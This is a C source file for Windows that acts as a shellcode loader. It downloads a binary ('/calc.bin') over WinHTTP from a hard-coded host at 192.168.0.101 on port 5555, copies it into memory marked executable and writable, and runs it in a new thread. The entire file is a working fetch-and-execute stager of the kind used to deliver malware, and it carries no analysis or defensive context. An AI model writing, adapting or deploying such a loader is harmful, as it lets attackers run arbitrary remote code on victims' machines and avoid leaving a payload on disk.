#include <windows.h>
#include <winhttp.h>

int main(){

    PBYTE shell  = NULL;
    DWORD shells = 0x00; 
    PWSTR    wHost    = L"192.168.0.101";
    int      Port     = 5555;
    PWSTR    wPath    = L"/calc.bin";

    GetRDI( wHost, Port, wPath, &shell, &shells);
    PVOID pAddr = VirtualAlloc( NULL, shells, 0x3000, PAGE_EXECUTE_READWRITE );
    memcpy(pAddr, shell, shells);
    HANDLE hThread = CreateThread( NULL, NULL, pAddr, NULL, NULL, NULL );
    WaitForSingleObject( hThread, INFINITE );

}

void GetRDI( _In_ LPWSTR Host, _In_ int Port, _In_ LPWSTR Path, _Out_ PBYTE *ByteCodes, _Out_ DWORD *ByteSize) {
    
	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    
	WCHAR wMethodRequest[] = L"GET";
    
    BOOL  bResults     = FALSE;
    DWORD dwSize       = 0x00;
    DWORD dwDownloaded = 0x00;
    BYTE* pTempBuffer  = NULL;

    PVOID Heap = GetProcessHeap();

    hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        goto _END;
    }

    hConnect = WinHttpConnect(hSession, Host, Port, 0);
    if (!hConnect) {
        goto _END;
    }

    hRequest = WinHttpOpenRequest(hConnect, wMethodRequest, Path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        goto _END;
    }

    bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!bResults) {
        goto _END;
    }

    bResults = WinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) {
        goto _END;
    }

    DWORD dwContentLength = 0x00;
    DWORD dwSizeSize      = sizeof(DWORD);
    bResults = WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwContentLength, &dwSizeSize, NULL);
    if (!bResults) {
        goto _END;
    }

    pTempBuffer = (BYTE*)HeapAlloc(Heap, 0, dwContentLength);
    if (!pTempBuffer) {
        goto _END;
    }

    do {
        bResults = WinHttpReadData(hRequest, (LPVOID)(pTempBuffer + dwDownloaded), dwContentLength - dwDownloaded, &dwSize);
        if (bResults) {
            dwDownloaded += dwSize;
        } else {
            HeapFree(Heap, 0, pTempBuffer);
            pTempBuffer = NULL;
            goto _END;
        }
    } while (dwSize > 0 && dwDownloaded < dwContentLength);

    *ByteCodes = pTempBuffer;
    *ByteSize  = dwContentLength;

_END:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
}